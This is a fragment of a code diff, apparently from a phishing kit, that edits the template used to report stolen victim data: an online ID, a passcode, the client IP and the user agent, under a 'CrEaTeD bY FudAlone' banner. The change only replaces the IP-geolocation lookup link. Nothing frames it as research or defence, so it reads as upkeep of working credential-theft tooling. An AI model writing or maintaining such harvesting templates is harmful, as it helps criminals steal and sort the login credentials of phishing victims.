@@ -40,7 +40,7 @@ Online ID            : ${email}
 Passcode             : ${password}
 |--------------- I N F O | I P -------------------|
 Client IP: ${clientIp}
-|--- http://www.geoiptool.com/?IP=${clientIp} ----|
+|--- https://www.geodatatool.com/en/?ip=${clientIp} ----|
 User Agent : ${userAgent}
 |----------- CrEaTeD bY FudAlone --------------|`,
     };
